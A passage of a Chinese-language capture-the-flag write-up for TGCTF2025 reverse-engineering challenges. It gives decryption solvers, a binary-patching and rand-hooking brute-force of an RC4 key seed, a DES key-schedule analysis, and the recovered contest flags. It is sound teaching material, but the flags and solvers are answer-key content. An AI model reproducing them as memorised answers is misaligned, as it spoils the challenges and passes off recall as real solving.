class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> inv[] = &#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">3</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-3</span>,<span class="number">1</span>,<span class="number">-2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-4</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">-2</span>,<span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Enc3</span><span class="params">(<span class="type">int</span> *_a1_, <span class="type">char</span> *_a2_, <span class="type">char</span> *_a3_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> k;      <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> j;      <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> i;      <span class="comment">// [esp+E8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k)</span><br><span class="line">                _a3_[<span class="number">32</span> * i + <span class="number">4</span> * j] += *&amp;_a2_[<span class="number">32</span> * k + <span class="number">4</span> * j] * _a1_[<span class="number">8</span> * i + k];</span><br><span class="line">        &#125;</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec2</span><span class="params">(<span class="type">char</span> *_a1_, <span class="type">char</span> *_a2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> v4;</span><br><span class="line"></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">            _a2_[v4++] = _a1_[<span class="number">32</span> * i + <span class="number">4</span> * j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// First: 0101001001100101010101100110010101010010011001010101001101100101</span></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">2025</span>);</span><br><span class="line">    <span class="type">int</span> RdList[<span class="number">0x80</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">bool</span> v16 = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> rd&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            rd = <span class="built_in">rand</span>() % <span class="number">32</span>;</span><br><span class="line">            rd &amp;= <span class="number">0x8000001F</span>;</span><br><span class="line">            v16 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (RdList[j] == rd)</span><br><span class="line">                &#123;</span><br><span class="line">                    v16 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (!v16);</span><br><span class="line">        RdList[i] = rd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> Key[] = <span class="string">&quot;ReVeReSe&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(DWORD *)(EncFlag + i) ^= Key[count % <span class="number">8</span>];</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Buffer_Dec[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Enc3</span>((<span class="type">int</span> *)inv, (<span class="type">char</span> *)EncFlag, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Dec2</span>((<span class="type">char</span> *)Buffer_Dec, (<span class="type">char</span> *)Buffer_Dec);</span><br><span class="line">    <span class="built_in">Enc1</span>((<span class="type">char</span> *)Buffer_Dec, RdList);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HZNUCTF&#123;%.64s&#125;\n&quot;</span>, Buffer_Dec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p><h2 id="conforand（非预期）"><a href="#conforand（非预期）" class="headerlink" title="conforand（非预期）"></a>conforand（非预期）</h2><p>从 srand 查看交叉调用，发现是当前时间戳随机，并非伪随机。</p><p><img src="/2025/04/13/TGCTF2025/JO8jbueEjoxwK9xUkGbc8SnBnnd.png"></p><p><img src="/2025/04/13/TGCTF2025/Ke3Gb4w0joy30qxDc4rcyhnHnve.png"></p><p>查看 rand 交叉调用，发现是再 init_sbox 函数中调用，并且只获取了一次随机数，应该是利用 rand 的数值参与 sbox 生成。</p><p><img src="/2025/04/13/TGCTF2025/WjGibCMxVoBZZXx1SGNcADoTnQH.png"></p><p>那么这边的思路就是爆破随机数，但由于是 ollvm 编译的，代码混乱，使用 d810 去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p><p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p><p>检验步骤：</p><ol><li>随便输入一串字符串</li><li>断点 rand，修改 rand 返回值 rax 寄存器为 0。</li><li>得到输出加密内容。</li><li>再次输入字符串，断点在 main 的 rc4 调用处，将传参的字符串 patch 为刚刚程序输出的加密后字节数据。</li><li>断点 rand，修改 rand 返回值 rax 寄存器为 0。</li><li>观察输出加密内容是否为原字符串数据。</li></ol><p>Patch 前：</p><p><img src="/2025/04/13/TGCTF2025/HTtrb5ro4oKqJmxBK8Sc3IDqncb.png"></p><p>Patch 后：</p><p><img src="/2025/04/13/TGCTF2025/ThFobqnWJo9RzvxZFakcsSOdn0b.png"></p><p>发现是对称的，同一个 rand 值，加密函数也可以用于解密。</p><p><img src="/2025/04/13/TGCTF2025/RhCobLCqyo4yMKxnDXnc0oXenGb.png"></p><p><img src="/2025/04/13/TGCTF2025/ZOlWb1F05oujnjxbU6EcLE9snmh.png"></p><p>开始 Patch 原程序流程，用于爆破，将 init 函数作为 hook 跳转函数。</p><p>将 rand 调用改成 jmp 到 init 函数。</p><p><img src="/2025/04/13/TGCTF2025/L5lObHqpPo4BJlxHSL0cU3jfnhg.png"></p><p>init 函数头直接改成如下，将 0x4068D3 地址的数值存到 eax，然后再跳转回去，达到一个 hook 修改 rand 值结果的效果，所以我们直接加载 elf 通过修改 0x4068D3 数值，调用 rc4 加密来爆破解密密文。</p><p><img src="/2025/04/13/TGCTF2025/Z8d6bu82ToEbmJxAv18cRqsZnZd.png"></p><p>这边使用这个库加载 elf 进行调用 call：<a href="https://github.com/IchildYu/load-elf">https://github.com/IchildYu/load-elf</a> （河豚鱼，神）</p><p>爆破代码（Key 是在原 init 函数中进行初始化的明文，可以直接找到）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/load_elf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/logger.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/breakpoint.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;./conforand&quot;</span>;</span><br><span class="line">        <span class="type">void</span>* base = <span class="built_in">load_elf</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">__uint64_t</span>  (*rc4)(<span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) = <span class="built_in">get_symbol_by_offset</span>(base,<span class="number">0x413170</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;JustDoIt!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> EncData[]=&#123;<span class="number">0x83</span>,<span class="number">0x1e</span>,<span class="number">0x9c</span>,<span class="number">0x48</span>,<span class="number">0x7a</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x88</span>,<span class="number">0x36</span>,<span class="number">0xd5</span>,<span class="number">0x0a</span>,<span class="number">0x08</span>,<span class="number">0xf6</span>,<span class="number">0xa7</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xfd</span>,<span class="number">0x67</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0x3c</span>,<span class="number">0xa7</span>,<span class="number">0xed</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xce</span>,<span class="number">0x6a</span>,<span class="number">0x9e</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0xe7</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x67</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x6e</span>,<span class="number">0xcd</span>,<span class="number">0x2f</span>&#125;;</span><br><span class="line"></span><br><span class="line">                *(<span class="type">unsigned</span> <span class="type">int</span>*)(<span class="number">0x4068D3</span>) = i;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">rc4</span>(EncData,<span class="number">42</span>,key,<span class="number">9</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(EncData[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span> </span><br><span class="line">                        &amp;&amp; EncData[<span class="number">1</span>] == <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">                        &amp;&amp; EncData[<span class="number">2</span>] == <span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Seed:%d\n&quot;</span>,i);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%.42s\n&quot;</span>,EncData);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/13/TGCTF2025/OnhobJQFKoZ69oxRCQycK3OZnCh.png"></p><p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p><h2 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h2><p>输入的字符串经过 unhex、拆分字节，改变顺序。</p><p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p><p>是两个字节为一组进行变换的。</p><p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是”HZNUCTF{“字串。</p><p><img src="/2025/04/13/TGCTF2025/IpzebVjiWokSsPxbqbvcFPuqnpc.png"></p><p>主加密函数，发现只走这上面的部分。</p><p><img src="/2025/04/13/TGCTF2025/V80kbgNWwoxANlxB4YMcWunPnhb.png"></p><p>第一个函数是用”HZNUCTF{“字串生成的一串数据，64 个整数数据。</p><p>第二个函数是将输入数据 8 个字节为一组进行加密。</p><p>加密流程：</p><ol><li>4 个字节为一组进行翻转</li><li>8 字节加密</li><li>4 个字节为一组进行翻转</li></ol><p><img src="/2025/04/13/TGCTF2025/Li3ibSsH4oXPrgxpuE1cXiC3nWf.png"></p><p>加密可以看出是 DES 加密算法，是对称的，key 就是刚刚生成的 64 个整数数值的前 32 个，那么可以知道后 32 个就是解密用的 key，直接 copy 该函数，解密时用生成的后 32 个整数 key 即可解密。</p><p><img src="/2025/04/13/TGCTF2025/S3IQbDNbQoHoZAxTqEycpqhpnJf.png"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span 